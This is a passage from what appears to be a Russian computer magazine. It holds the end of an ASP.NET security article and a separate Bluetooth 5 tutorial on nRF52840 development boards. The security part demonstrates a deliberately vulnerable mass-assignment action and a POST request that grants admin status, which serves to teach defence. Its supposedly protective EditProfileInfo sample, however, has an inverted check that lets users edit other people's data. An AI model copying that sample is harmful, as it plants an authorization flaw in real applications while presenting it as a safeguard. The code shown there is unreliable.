<form asp‐action="Vulnerable" asp‐Controller="Home">
    <div class="form‐group">
        <label asp‐for="Name"></label>
        <input class="form‐control" type="text" asp‐for="Name" />
    </div>
    <div class="form‐group">
        @if (Model.IsAdmin)
        {
            <i>You are an admin</i>
        }
        else
        {
            <i>You are a standard user</i>
        }
    </div>
    <button class="btn btn‐sm" type="submit">Submit</button>
</form>

С помощью этой вьюшки можно редактировать только имя пользователя,
не так ли?
  А теперь давай перейдем к столь же простому коду:


[HttpPost]
public IActionResult Vulnerable(int id, UserModel model)
{
    return View("Index", model);
}

Все ли здесь нормально? Как оказывается, нет. А все из‐за того, что экшен
помечен как HttpPost. Чтобы убедится в этом, достаточно открыть утилиту
вроде Postman или Fiddler и отпра вить POST‐запрос на адрес с указанием
параметров id и IsAdmin. Если мы тестиру ем локально, то адрес может быть
таким: localhost:51696/Home/Vulnerable?id=34&IsAdmin=true.





                Результат выполнения POST‐запроса

Как видно на скрин шоте, получен дос туп к секретной информации (в HTML‐
коде есть строка You are an admin). Как защититься от этого типа атаки?
Самый простой вариант — не попадать в ситуацию, когда с HttpPost переда‐
ется какой‐нибудь объект. А если это го не избежать, нужно быть готовым
к тому, что передано может быть все что угодно. Один из вариантов —
это создать какой‐то отдельный класс для передачи его через HttpPost.
Это может быть как базовый класс текущего класса с общедоступны ми
параметрами, так и класс‐двойник. В этом клас се важные поля можно
пометить атрибутом Editable со значением false:


[Editable(false)]


HEADER’Ы ПРОТИВ АТАК
Утереть нос хакерам помогает установка определенных значений в заголовок
запроса. Заголов ки поддерживаются большинс твом современных браузеров
(да‐да, старые версии идут лесом), поэтому сейчас мы рассмотрим некото‐
рые популярные виды атак, избежать которых поможет установка Header’ов.


XSS
Для дополнительной защиты можно использовать заголовок content‐secu‐
rity‐policy. Он позволит загружать контент лишь с опре деленных ресурсов.
Например, можно разрешить запуск скриптов только с текущего сайта:


content‐security‐policy: script‐src 'self'

Есть еще возможность указать доверенные сайты, доступ к содержимому
которых разрешен. Следующий заголо вок тоже помогает защититься от XSS,
хотя, как правило, он вклю чен браузерами по умолчанию: x‐xss‐protection.
Пример:


x‐xss‐protection: 1; mode=block


Clickjacking
Сайт может показать пользователю окошко, ссылку или баннер, поверх
которого добавлена скрытая кнопка/ссылка  внутри проз рачного  iframe.
И получается, что поль зователь кликает на что‐то, на что он хочет кликнуть,
но при этом фактически он щелкает на скрытый объект против своей воли.
   Установка заголовка X‐FRAME‐OPTIONS со зна чением DENY запретит
помещать страницы тво его сайта в iframe. Если у тебя на сай те нет фреймов,
то это хороший вариант. Если же ты используешь iframe для отображения
страниц, то значение SAMEORIGIN раз решит отоб ражать страницы сайта
во фрейме, но только на других страницах того же самого твоего сайта.


MIME sniffing
Зачастую злоумышленник может загрузить вредоносный код в виде файла
с совершенно безобидным рас ширением. Допус тим, используя в качестве
тега video. И может случиться так, что браузер рас познает файл как код
и выполнит его. Чтобы этого не про изошло, может использоваться установка
заголовка  X‐Content‐Type‐Options:  nosniff.  При  получении  этого
заголовка браузер будет про верять, соответству ет ли формат содержимого
файла тому, который ука зан (эта проверка и называ ется MIME sniﬃng).


Referrer-Policy
Браузеры автоматически добавляют в заголовки запросов при переходе
на сайт ссылку на тот, с которого был совершен переход. Это очень удобно
для аналитики. Например, не сос тавит большого труда написать код, который
соберет статистику со списком ресурсов, отку да посетители заходят на твой
сайт. Однако если в строке адреса на тво ем сайте име ются запросы
с какой‐то конфиденциальной информацией, то очень желательно было бы
скрыть эту информацию от других сайтов. Например:


http://www.somegoodsite.com/Edit?id=34543276654

Для того чтобы скрыть ссылку при переходе на чужой сайт, можно установить
заголовок со значением Referrer‐Policy: no‐referrer.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
ASP.NET ПОД ЗАЩИТОЙ
            КАК НЕ ДОПУСТИТЬ MASS ASSIGNMENT, XSS,
           CSRF, CLICK‐JACKING, MIME SNIFFING, SQL IN‐
                       JECTION И МНОГОГО ДРУГОГО





Каким образом мож но добавить на сайт заголовки запросов?
Заголовки запросов можно уста новить как с помощью нас троек IIS, так и из
кода приложения. Настройку  IIS рассматривать не будем, а поговорим
про варианты установки заголовков из кода.
   Чтобы добавить заголо вок в ASP.NET Core, можно создать Middleware.
Middleware, как можно понять из названия, — это промежуточный код, находя‐
щийся посередине цепочки про цес са запросов и отве тов. Вот пример пары
классов, позволяющих добавить заголовок X‐Frame‐Options:DENY:


public class HeadersMiddleware
{
    private readonly RequestDelegate _next;
    public HeadersMiddleware(RequestDelegate next)
    {
        _next = next;
    }
    public async Task Invoke(HttpContext context)
    {
        IHeaderDictionary headers = context.Response.Headers;
        headers["X‐Frame‐Options"] = "DENY";
        await _next(context);
    }
}
public static class HeadersMiddlewareExtensions
{
    public static IApplicationBuilder UseHeadersMiddleware(this
IApplicationBuilder builder)
    {
        return builder.UseMiddleware<HeadersMiddleware>();
    }
}

Зарегистрировать получившийся Middleware можно в методе Conﬁgure файла
Startup.cs одной строкой:


app.UseHeadersMiddleware();

Теперь среди списка заголовков, полученных от сервера, мы сможем увидеть
наш недавно добавленный X‐Frame‐Options.





                      Список заголовков

Можно даже не исполь зовать Middleware, а добавить заголовок сразу в метод
Conﬁg файла Startup.cs, заменив


app.UseHeadersMiddleware();

на


app.Use(async (context, next) =>
{
    context.Response.Headers.Add("X‐Frame‐Options", "SAMEORIGIN");
    await next();
});

Этот способ выглядит проще. Кро ме того, с его помощью можно установить
заголовки как для всего контента, так и только для динамического (соответс‐
твенно, добавить код до строки app.UseStaticFiles() и после).


             INFO

                   Динамический контент — это файлы, которые
                      содержат в себе динамические данные модели.
                      Статический  кон тент  —  это  такие  файлы,
                         как HTML, CSS, JS, JPG и подобные.


В классическом ASP.NET заголовок добавляет ся немного иначе. Есть два
варианта. Первый — это добавить в секцию system.webServer файла web.
config теги. Например, такие:


<httpProtocol>
      <customHeaders>
        <add name="X‐Frame‐Options" value="SAMEORIGIN" />
        <remove name="X‐Powered‐By" />
      </customHeaders>
</httpProtocol>

Заметь, что можно не только добавлять, но и удалять теги. В примере уда‐
ляется заголовок X‐Powered‐By. Чем меньше информации мы раскры ваем,
тем лучше, не так ли? Результат на скриншоте.





                      Список заголовков

Кроме заголовка X‐Powered‐By, вполне можно убрать еще и заголовки Server
и X‐AspNet‐Version.
   Второй вариант добавления заголовков — это добавить метод Applica‐
tion_BeginRequest в файл Global.asax:


protected void Application_BeginRequest(object sender, EventArgs e)
  {
      HttpContext.Current.Response.AddHeader("X‐FRAME‐OPTIONS",
"DENY");
  }


NWebsec
Для добавления заголовка можно вос пользовать ся и довольно популярным
NuGet‐пакетом под названием NWebsec. Его автор — Андре Клингсхейм (An‐
dré N. Klingsheim). NWebsec можно использовать как с обычными ASP.NET‐
приложениями, так и с Core 1.1. В приложении ASP.NET после установки
пакета в web.conﬁg появятся следующие теги:


<nwebsec>
    <httpHeaderSecurityModule xmlns="http://nwebsec.com/HttpHe
aderSecurityModuleConfig.xsd" xmlns:xsi="http://www.w3.org/2001/
XMLSchema‐instance" xsi:noNamespaceSchemaLocation="NWebsecConfig/
HttpHeaderSecurityModuleConfig.xsd">
    </httpHeaderSecurityModule>
</nwebsec>

В качестве их содержимого можно добавить установку заголовков. Скажем,
такой вариант:


<redirectValidation enabled="true" />
<securityHttpHeaders>
  <x‐XSS‐Protection policy="FilterEnabled" blockMode="true"/>
  <content‐Security‐Policy enabled="true">
  </content‐Security‐Policy>
  <x‐Frame‐Options policy="Deny"/>
  <x‐Content‐Type‐Options enabled="true" />
</securityHttpHeaders>

Если ты используешь ASP.NET Core, то рекомендуемый вариант добавления
заголовков выглядит так:


app.UseXContentTypeOptions();
app.UseReferrerPolicy(opts => opts.NoReferrer());

перед


app.UseStaticFiles();

и после


app.UseXfo(xfo => xfo.Deny());
app.UseRedirectValidation();

Один большой минус NWebsec — версия .NET Core 2.0 пока что не поддержи‐
вается.


САМЫЕ СТРАШНЫЕ ОШИБКИ КОНФИГУРИРОВАНИЯ
Хранение стро ки под ключения к базе дан ных
Если ты работаешь в полноценном ASP.NET, то лучший вариант хранения
строки подключения — это файл web.config. При чем храни строку не в
открытом виде, а в зашифрованном. Сделать это можно с помощью утилиты
aspnet_regiis.exe. Самый прос той вариант — запустить Developer Command
Prompt в режиме администратора и выполнить команду


aspnet_regiis.exe ‐pef connectionStrings  C:\inetpub\wwwroot\YourAp
pName

Два параметра команды — это раздел, который необ ходимо зашифровать (в
данном случае — connectionStrings), и путь к директории, в которой
находится файл web.config.
   Если ты работаешь в ASP.NET Core, то можешь использовать Secret Man‐
ager tool для хранения строк во время раз работки. Никакого готового вари‐
анта для продакшена .NET Core пока что нет. Но если ты хос тишь приложе ние
в Azure, то конфиденциальную информацию можно хранить в параметрах
приложения.





                   Парамет ры Azure Web App

При этом саму строку подключения лучше вынес ти в отдельный файл.
Из соображений безопасности этот файл неплохо бы исключить из системы
контроля версий.


<connectionStrings configSource="ConnectionStrings.config">
</connectionStrings>

Таким же образом можно вынести и конфиденциальные параметры:


<appSettings file="AppSettingsSecrets.config">
</appSettings>

В самом файле необ ходимо просто ука зать то содержимое, которое было бы
использовано в качестве содержимого тегов.


Скры тие сооб щений об ошиб ке
Видел когда‐нибудь «желтый экран смерти» с текстом кода, в котором воз‐
никла ошибка? Уверен, что никогда. :) Шутка. Я не случайно помес тил эту
рекомендацию сразу после «строки подключения». Тем нагляднее будет при‐
мер, в котором зло умышленник может искусс твенным образом соз дать
ошибку и получить полезную для себя информа цию. В идеальном случае
это может быть строка подключения. Иног да даже мелочь может сократить
время поиска уязвимостей сайта! Если у нас классичес кое приложение AS‐
P.NET, то в web.conﬁg режим CustomErrors обя зательно оставляем On
или хотя бы RemoteOnly:


<customErrors mode="On" />

В ASP.NET Core можно разделить отображение для режима разработки и для
продакшена с помощью NuGet‐пакета Microsoft.AspNetCore.Diagnostics.
Например, для настрой ки отоб ражения сооб щения об ошибке в метод Con‐
ﬁgure класса StartUp можно добавить:


env.EnvironmentName = EnvironmentName.Production;
if (env.IsDevelopment())
{
    app.UseDeveloperExceptionPage();
}
else
{
    app.UseExceptionHandler("/error");
}


Еще несколько ошибок кон фигурирования web.config
Если вдруг  у тебя в web.conﬁg случайно попали нас тройки трейсинга
или дебага, то на продакшен‐сервере обязатель но поставь значения false.


<trace enabled="false" localOnly="true" />
<compilation debug="false" targetFramework="4.5" />

Чтобы взломщик не смог получить доступ к файлу куки (скажем, с помощью
XSS), значение следующего параметра должно быть true:


<httpCookies httpOnlyCookies="true" requireSSL="false"/>


Broken Authentication and Session Management
Для хранения паролей и дру гой конфиденциаль ной информации используй
только стойкие хеши с  salt. OWASP рекомендует Argon2, PBKDF2, scrypt
и bcrypt.
  Используй Forms authentication только для интранет‐сайтов. Для веба луч‐
ше юзать Identity. И кстати, не забудь в Identity ограничить чис ло попыток вво‐
да пароля, добавив в метод ConfigureServices файла Startup.cs сле‐
дующий код:


services.Configure<IdentityOptions>(options =>
{
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(30)
;
    options.Lockout.MaxFailedAccessAttempts = 10;
});

Если ты разрешаешь поль зователю редактировать свои данные, то проверяй,
действительно ли он меня ет имен но их (помним о том, что полученным дан‐
ным не стоит доверять):


public ActionResult EditProfileInfo(int id)
{
    var user = _context.Users.FirstOrDefault(e => e.Id == id);
    if (user.Id != _userIdentity.GetUserId())
    {
      // Редактируем данные
    }
    // ...
}


ЗАКЛЮЧЕНИЕ
В этой статье я постарался соб рать все, что может пригодиться раз работчику
на ASP.NET в плане безопасности. «Все» не получилось: из моего поля зре‐
ния выпали, например, ошибки конфигурирования  IIS. Но надеюсь, что
получилось многое: этого материала тебе хва тит, чтобы усвоить основные
правила безопасной раз работки и не совершать грубых ошибок.
FERRUM

ЮЗАЙ НОВЫЙ БЛЮТУС,
BLE-ПЯТЬ!

ВДВОЕ БЫСТРЕЕ,
ВЧЕТВЕРО ДАЛЬНОБОЙНЕЕ





   Дмитрий Коржавин
    dmitriycor@hotmail.com





С ростом  количества  сетевых беспроводных  устройств
(охранные  и  пожарные  сигнализа ции,  телемедицина,
мониторинг окружающей среды и множество других) появ‐
ляются новые и совершенствуются старые стандарты и про‐
токолы бес проводной связи. Разные компании и DIY‐раз‐
работчики используют для сво их устройств и сетей разные
стандарты передачи дан ных, нап ример ZigBee, Z‐Wave, Blue‐
tooth 4, Wi‐Fi, 6LoWPAN, Thread, ANT или собственные проп‐
риетарные протоколы. Не так дав но вышла новая специфи‐
кация стандарта радиосвязи для обмена данными по воздуху
Bluetooth 5. В этой статье я на примере программирования
новейшего микроконтроллера покажу пре имущества нового
стандарта.


На правах любяще го логику «программиста с паяль ником» :) начну статью
с плана.
 1. Обзор стандарта. Преиму щества пятой версии в сравнении с четвертой.
 2. Выбор железа. Приемник, передатчик.
 3. Описание отладочной платы и микроконтрол лера. В этой части я расскажу
   о параметрах выбранного микроконтроллера и отладочной платы.
 4. Начало работы с SDK (software development kit) под выбранный микрокон‐
   троллер. Здесь описывается, как начать раз рабаты вать прос тые ради‐
   оприложения под Bluetooth Low Energy четвертой версии на нашей отла‐
   дочной плате. Что бы мы привыкли к новому набору инстру ментов и на кон‐
   кретном примере научились общаться по Bluetooth c Android‐телефоном.
 5. Тест нового стандарта Bluetooth 5. В этой части мы сделаем две прошивки
   для двух отладочных плат и рассмотрим новые режимы радиопередачи
   по Bluetooth 5.


ОБЗОР СТАНДАРТА BLUETOOTH 5
Что мы знаем о новом стандарте? Мы знаем, что он обратно совместим с чет‐
вертыми версиями спецификации BLE (Bluetooth Low Energy, Bluetooth Smart),
то есть с версиями 4.0, 4.1, 4.2, и позволяет новым устройствам с Bluetooth
5 общаться со старыми девайсами (разумеется, новые фичи будут недос‐
тупны). В четвертых версиях BLE, в полном соответствии с названи ем, поз‐
волял проектировать устройства с гораз до меньшим потребле нием, чем
Bluetooth  Classic. Но  все  остальное,  кро ме  энергопотребления, было
не очень — я про скорость, объем передаваемых данных в одном пакете
и дальность. Все эти свойства улучшает Bluetooth 5.
   Более подробно можно узнать на официальном сайте Bluetooth 5, а мы
сейчас кратко остановимся на главных преимуществах пятой версии.


        WWW

                      Все новые Bluetooth‐спецификации пуб ликуются
                        здесь.



Вы сокая про пускная спо соб ность дан ных
Вместе с усовершенство ваниями, введенными в Bluetooth 4.2, которые поз‐
воляли увеличить объем данных в одном пакете, и еще большим увеличением
возможного объема данных в пакете в Bluetooth 5 (DLE) общая пропускная
способность стала впятеро выше, чем исходный уровень Bluetooth 4.0!
   Теперь чистая пропускная способ ность данных без учета накладных рас‐
ходов, таких как адресация, мо жет достигать 1,4 Мбит/c. Зачем нужна
такая высокая скорость? Согласен, дурацкий вопрос, даже не знаю, зачем я
его придумал. :) Пользователей‐аудиофилов это порадует скоростью переда‐
чи качественной музыки, а для нас, гиков, открывает воз можность гораздо
быстрее обновлять прошивку устройства «по воздуху» (OTA‐DFU). Все го же
благодаря изменениям, внесенным в физический (PHY) слой для работы
Bluetooth‐радио, стали дос тупны четыре скорости:
 • 2 Мбит/с;
 • 1 Мбит/с;
 • 500 Кбит/с;
 • 125 Кбит/с.

Уверен, что с первыми дву мя скоростями тебе уже все ясно, но вот вопрос:
зачем при таком богатстве нужны две «нижние переда чи»?
   А дело в том, что при низких скорос тях и связанной с ними LE закоди‐
рованной обработке с использованием пря мой коррекции ошибок (FEC) ста‐
новится легче отказаться от повторной переда чи данных в окру жающем
шуме. Короче говоря, чувствительность улучшается. И не надо при высоком
уровне шума повторно запрашивать пакеты данных (маленький квадрокоптер
может улететь дальше от пульта управления).


Уве личе ние про пускной спо соб ности вещания
Для снижения загрузки вещательного (advertisment, рекламного  :)) канала
и решения проблемы перег рузки каналов предлага ются ве щательные рас-
ширения (они же «рекламные расширения»).
   Расширение длины дан ных и новый PHY‐уровень означают, что длина
пакетов увеличивается с точки зрения фактичес ких данных и вре мени,
в течение которого они занимают канал. Поскольку существуют только три
рекламных канала, эти каналы вскоре могут перегружаться вещательными
пакетами с большими объема ми данных при более низких скоростях переда‐
чи в эфире, таких как 125 Кбит/с.
   Рекламные расширения смягчают эту потенциальную проблему.


Улуч шенное сосущество вание с улуч шенным чередо ванием
каналов
Bluetooth 5 также предос тавил усовершенс твованный алгоритм секвениро‐
вания каналов (CSA # 2) для улучшения псевдослучайного последовательного
переключения каналов. CSA # 2 повысит производительность сосущес тво‐
вания разрешенных устройств при наличии вокруг Wi‐Fi и других Bluetooth‐
устройств. Все SoCs серии nRF52 имеют возможность поддерживать CSA #
2.


BLE Mesh — пока толь ко 4.0
Ячеистая топология — сетевая тополо гия компь ютерной сети, пос троенная
на принципе ячеек, в которой радиостанции сети соединяются друг с дру гом
и способны принимать на себя роль коммутатора для остальных участников.
Эта организация сети дос таточно сложна в настройке, однако при такой
топологии достигается высокая  отка зоус тойчивость. Как правило, узлы
соединяются по прин ципу «каждый с каждым».
   Таким образом, большое количество связей обеспечивает широкий
выбор маршрута следования трафика внутри сети, а значит, обрыв одного
соединения не нарушит работу сети в целом. Но BLE Mesh‐сети рассчитаны
(по крайней мере пока) на Bluetooth стандарта чет вертых версий.



ВЫБОР ЖЕЛЕЗА
На момент написания этой статьи пятую версию протокола поддерживали
смартфоны Samsung и Sony и в свободной продаже было довольно мало
BLE5‐совместимых устройств.





                     Плата nrf52840 Preview DK

Поэтому, чтобы оценить все воз можнос ти Bluetooth 5, я решил взять две
отладочные платы с микроконтроллером nRF52840 компании Nordic Semi‐
conductor. Почему именно их? Просто Nordic Semiconductor давно славится
своими разработками именно в области Bluetooth‐микросхем. Кроме того, их
разработки традиционно отличаются вменяемой ценой и богатой докумен‐
тацией. Чипы серии nRF52 и конкретно nRF52840 представляют собой сис‐
тему на кристалле (SoC, System on a Chip) и, согласно документации, муль‐
типротокольны — могут работать со стандартами Bluetooth 5, Bluetooth Low
Energy, ANT, 802.15.4, 2.4GHz RF. Поддерживают они и NFC.


             INFO

                      Все многопротокольные SoCs серии nRF52 под‐
                      держивают перечисленные фичи. Кроме  того,
                      nRF52840 имеет  улучшенную выходную мощ‐
                          ность, что вместе с новыми функциями Long
                      Range    (увеличение   рассто яния   вещания)
                       переполняет сердце разработ чика безотчетной
                        радостью. :)


NRF52840 — это усовер шенствованный мно гопроцессорный SoC, идеально
подходящий для сверхмалых беспро водных приложений. Име ет пол ную аппа‐
ратную поддержку Bluetooth 5 (включая увеличенную дальность вещания).
Софт nRF52840 крутится на 32‐битном процессоре ARM Cortex‐M4F (64 МГц
достаточно  каждому  (с)  почти Билл  Гей тс)  с 1 Мбайт флеш‐памяти
и 256 Кбайт ОЗУ на чипе. Поддерживает инс трукции DSP (цифровая обработ‐
ка сигнала), вычисления с плавающей точкой (FPU).
   Поддерживает несколь ко протоколов, включая Bluetooth с низким энер‐
гопотреблением,  ANT  (кто‐нибудь  использовал  этот  протокол?    :)),
802.15.4 и 2.4GHz.
   NRF52840 SoC использует управление питанием, чтобы максимизировать
энергоэффективность приложений и время автономной работы. Запитать чип
можно от напряжения пос тоянного тока в диапазоне от 1,7 до 5,5 В.
   EasyDMA, как и все DMA (прямой доступ к памяти), позволяет разгрузить
ЦП нашего микроконтроллера, например чтобы передавать потоки данных
из АЦП в UART без участия ядра.
  В SoC есть также мощный криптогра фичес кий соп роцес сор на кристалле
(ARM Cryptocell‐310), обес печивающий криптогра фические функции и услуги
для ускорения операций, экономии времени обра ботки процессором данных
и сок ращения потребления энергии. Он включает в себя настоящий генера‐
тор случайных чисел (TRNG) и поддерживает широкий спектр асимметричных,
симметричных и хеширующих криптогра фических сервисов. NFC также под‐
держивается в чипе.
   NRF52840 имеет встроенную поддержку USB 2.0 (full speed) и встроенное
регулирование питания, позволяющее напрямую подключаться к USB‐хостам
для передачи данных.
   Чип сов местим с существу ющими сериями nRF52, nRF51 и nRF24 Series
от Nordic Semiconductor.


SoftDevice
Стеки беспроводных протоколов от Nordic Semiconductor известны как Soft‐
Devices. NRF52840 поддерживается S140 SoftDevice.
   S140 SoftDevice — это поддерживающий Bluetooth 5 (пока alpha).



ОТЛАДОЧНАЯ ПЛАТА
Отладочную плату на основе это го микроконтроллера я выбрал под стать
чипу, вот она: nRF52840 Preview DK Development Kit for nRF52840. Между про‐
чим, к ней прилагается NFC‐антенка!
   NRF52840 PDK — это универсальный комплект для разработки плат
для   Bluetooth   5,   Bluetooth  с  низким  энергопотреблением,   ANT,
802.15.4 и 2.4GHz с использованием nRF52840 SoC. Этот комплект под‐
держивает разработку для SoC nRF52840.
   Набор аппаратно совместим с Arduino Uno Revision 3, позволяет исполь‐
зовать сторонние шилды, совместимые с этим стандартом. Антенна NFC
может быть подклю чена к набору, чтобы активировать функциональность тега
NFC. Комплект обеспечивает дос туп ко всем входам и выходам через
интерфейсы и имеет четыре светодиода и четыре кнопки, которые прог‐
раммируются пользователем.
  Он поддерживает стандартную цепочку инс трументов разработки Nordic
Software Development с использованием Keil, IAR и GCC. Опции программы /
отладки в комплек те — это Segger J‐Link OB.
   Кроме всего прочего, на основе младшего чипа серии nRF52832 уже
существуют платы для платформы Arduino, например Arduino Primo. Почему
это хорошо? Да потому, что это избавляет тебя от кодинга на С.


ПЕРВЫЙ ПОЛЕТ
Для того чтобы заставить нашу отладочную плату совершать обмен с телефо‐
ном или ПК c поддержкой BLE 4 (для начала), дос таточно включить питание
и воспользоваться «быстрым стартом», но мы же хотим сами научиться
писать программы под пла ту и чип?
   Поэтому качаем SDK — набор средств разработки, который поз воляет
программистам создавать приложения для определенного пакета программ,
программного обеспечения базовых средств разработки. Помимо всего
остального, SDK содержит и примеры готовых приложе ний — как в сорцах,
так и скомпилированных. Поп робуй погонять скомпилированные приложе‐
ния — они не требуют установки и пол ной инстру ментальной цепочки. Если
все работает как надо, проследуй в раз дел «Нас тройка комплекта для раз‐
работки» (для nRF52840) или «Настройка набора для разработки» (для nR‐
F52832) для получения дополнитель ной информации. Затем установи SDK.
   Чтобы проверить нас тройку набора разработки, советую использовать
пример Blinky . Шаги, описанные в раз деле «Компиляция и запуск первого
примера», проведут тебя через тестирова ние установки с помощью примера
 Blinky.
   После тестирования установки мы должны запрограммировать SoftDevice
и запустить пример, в котором он использует ся.


Важ ная теория
Начало нашего пути — это infocenter. Здесь собрана вся документация на все
примеры и SDK разных версий. Также рекомендую посетить блог и форум,
где можно найти ответы на интересующие воп росы. Советую ознакомиться
и с туториалами для разработки BLE‐приложений, и с тем, как начать писать
в Eclipse и компилировать проекты с GCC.
   А вот здесь есть рекомендации по разводке печатных плат.





                                      Продолжение статьи →
FERRUM              ← НАЧАЛО СТАТЬИ
ЮЗАЙ НОВЫЙ БЛЮТУС,

                    ВДВОЕ БЫСТРЕЕ,
                      ВЧЕТВЕРО ДАЛЬНОБОЙНЕЕBLE-ПЯТЬ!





УСТАНОВКА SDK
Перед установкой SDK убедись, что у тебя установлены все необходимые
инструменты (см. «Нас тройка комплекта для раз работки» (для nRF52840)
или «Настройка набора для разработ ки» (для nRF52832)).
   Чтобы  настроить  среду,  загрузи файл  репози тория  nRF5_SDK_x.x.
x_xxxxxxx.zip (например, nRF5_SDK_v14.2.0_1a2b3c4.zip) с сай та devel‐
oper.nordicsemi.com. Извлеки ZIP‐файл в каталог, который хочешь исполь‐
зовать для работы с SDK.
   Установи nRF5 MDK. Если у тебя Keil 5, открой пример проекта. Затем Keil
предложит установить nRF_DeviceFamilyPack. Если  Keil не спрашивает
сам, то открой Install Pack, нажми кнопку Check For Updates и установи пос‐
леднюю версию nRF_DeviceFamilyPack.


             INFO

                    NRF5 SDK v14.2.0 обеспечивает эксперименталь‐
                     ную под держку SoC nRF52840. Однако не все
                     функции поддерживаются  на nRF52840. Под‐
                      робнее см. примечания к выпуску.


Если  у тебя  Keil  4, дваж ды щелкни файл nRF5x_MDK_x_x_x_Keil4.msi
в извлеченном катало ге. Юза ешь IAR? Дважды щел кни файл nRF5x_MD‐
K_x_x_x_IAR.msi в извлеченном каталоге, чтобы установить MDK.
   Пользователи GCC могут возрадовать ся: MDK пос тавля ется с SDK.
   Итак, для того чтобы начать создавать свои прошивки под микроконтрол‐
лер, нужно:
 1. Скачать и распаковать SDK с сайта developer.nordicsemi.com. Я взял вер‐
  сию nRF5_SDK_v14.2.0_1a2b3c4.zip (на этом сайте есть также и более ста‐
  рые версии SDK).
 2. Скачать и установить Keil 5 (нам нужен пакет MDK‐Arm).
 3. Открыть любой пример в папке с SDK. Например, в <InstallFolder>\ex‐
   amples\ble_peripheral\ble_app_blinky. При первом запуске при мера
   с SDK в IDE Keil предложит нам установить nRF_DeviceFamilyPack (набор
   вспомогательных инструментов). Если Keil мол чит и ничего не спрашивает,
   открой Install Pack, нажми кнопку Check For Updates и установи последнюю
   версию nRF_DeviceFamilyPack (на сай те есть учебные материалы о том,
   как работать с SDK в дру гих средах, нап ример IAR или Eclipse).
 4. Для загрузки прошивки в микроконтроллер нажать LOAD.
 5. Теперь можно протестировать пример с помощью устройства Android,
   второй отладочной платы или nRF Connect (прог рамма для работы с BLE
   через десктоп и USB‐донгл).





            Внешний вид приложения nRF Connect for Mobile

  Я выбрал вариант с приложением под Android.
     Чтобы протестировать приложение BLE Blinky, нужно установить при‐
   ложение nRF Blinky для Android. Оно дос тупно в Google Play и в хранилище
  nRF Blinky на GitHub.
 6. Запустить приложение BLE Blinky и соеди ниться с нашей отладочной пла‐
   той (последняя будет видна в списке устройств как Nordic_Blinky). Теперь,
   нажимая  на  изоб ражение  лампочки  в  при ложении, можно  зажечь
   и погасить светодиод на плате.





            Журнал приема сооб щений от служб устрой ства

Если же теперь мы откроем приложение, позволя ющее посмотреть службы,
которые нам доступны через BLE, например BLE Scanner или nRF Connect for
Mobile, то мы увидим, что:
 • если написать 01 в характеристику сос тояния светоди ода (0x1525), то све‐
   тодиод 3 на плате будет включен;
 • если написать 00 в характеристику сос тояния светоди ода (0x1525), то све‐
   тодиод 3 на плате будет выключен.





            Найденные служ бы подключенного устройства

Приложение BLE Blinky использует сервер службы све тодиодов и кнопок.
Это небольшая служба, которая переключа ет светодиоды и статус кнопок
приема с отладоч ной платы nRF5.
   Стек Bluetooth называется SoftDevice, он предварительно скомпилирован
в .hex‐файл и прошивается в ту часть памяти, в которой нет при ложе ния. При‐
ложение общается со стеком при помощи вызовов callback‐функций. Рас‐
положен в папке /components sdk.
  Можно прошить приложение и через программу nRFgo Studio. Интерфейс
этой программы незамысловат, достаточно выб рать файл, который нужно
прошить в область (для приложения одна область, для стека — другая).





      Вот что бывает, ког да прошиваешь приложение в память стека ;)

Давай теперь посмотрим, что находится внутри проекта.
  Для этого откроем проект BLE Blinky в Keil, слева в проекте будут рас‐
положены папки и файлы, из которых состоит наш проект. Если в папке Appli‐
cation открыть файл main.c и найти в файле функцию main, то можно увидеть
следующий код:


int main(void)
{
    // Initialize.
    leds_init(); // Инициализация ножек светодиодов на выход
    timers_init(); // Настройка таймеров
    log_init(); // Лог в консоль
    buttons_init(); // Инициализация ножек для кнопок на вход
    ble_stack_init(); // Вызов и настройка параметров стека
    gap_params_init(); // Определение роли устройства, сервер или
клиент
    gatt_init(); // Структура наших служб и атрибутов вообще
    services_init(); // Настройка содержимого служб
    advertising_init(); // Настройка параметров вещания
    conn_params_init(); // Настройка параметров соединения
    // Start execution.
    NRF_LOG_INFO("Blinky example started.");
    advertising_start(); // Начало вещания
    // Enter main loop.
    for (;;)
    {
        if (NRF_LOG_PROCESS() == false)
        {
            power_manage(); // Низкопотребляющий режим
        }
    }
}

Функция изменения состояния светодиода выглядит так:


static void led_write_handler(uint16_t conn_handle, ble_lbs_t * p_lbs
, uint8_t led_state)
{
    if (led_state)
    {
        bsp_board_led_on(LEDBUTTON_LED);
        NRF_LOG_INFO("Received LED ON!");
    }
    else
    {
        bsp_board_led_off(LEDBUTTON_LED);
        NRF_LOG_INFO("Received LED OFF!");
    }
}

а функция инициализации стека SoftDevice и BLE событий по прерываниям —
так:


static void ble_stack_init(void)
{
    ret_code_t err_code;
    err_code = nrf_sdh_enable_request();
    APP_ERROR_CHECK(err_code);
    // Настрой стек BLE, используя параметры по умолчанию
    // Получение начального адреса оперативной памяти приложения
    uint32_t ram_start = 0;
    err_code = nrf_sdh_ble_default_cfg_set(APP_BLE_CONN_CFG_TAG, &
ram_start);
    APP_ERROR_CHECK(err_code);
    // Включение BLE
    err_code = nrf_sdh_ble_enable(&ram_start);
    APP_ERROR_CHECK(err_code);
    // Регистрация обработчика для событий BLE
    NRF_SDH_BLE_OBSERVER(m_ble_observer, APP_BLE_OBSERVER_PRIO,
ble_evt_handler, NULL);
}

Функция инициализации нашей службы:


static void services_init(void)
{
    ret_code_t     err_code;
    ble_lbs_init_t init;
    init.led_write_handler = led_write_handler;
    err_code = ble_lbs_init(&m_lbs, &init);
    APP_ERROR_CHECK(err_code);
}

Функция для старта advertising — начала сеанса связи, рассылки и приема
пакетов в BLE:


static void advertising_start(void)
{
    ret_code_t           err_code;
    ble_gap_adv_params_t adv_params;
    // Старт вещания
    memset(&adv_params, 0, sizeof(adv_params));
    adv_params.type        = BLE_GAP_ADV_TYPE_ADV_IND;
    adv_params.p_peer_addr = NULL;
    adv_params.fp          = BLE_GAP_ADV_FP_ANY;
    adv_params.interval    = APP_ADV_INTERVAL;
    adv_params.timeout     = APP_ADV_TIMEOUT_IN_SECONDS;
    err_code = sd_ble_gap_adv_start(&adv_params, APP_BLE_CONN_CFG_TAG
);
    APP_ERROR_CHECK(err_code);
    bsp_board_led_on(ADVERTISING_LED);
}





         Запись значения 01 для того, чтобы зажечь светодиод

Как видишь, все логично и более‐менее понятно. :)
  Все функции и структуры хорошо документированы в infocenter. Если
что‐то непонятно, то всегда мож но обратиться к документации на infocentеr
или Nordic Developer Zone.


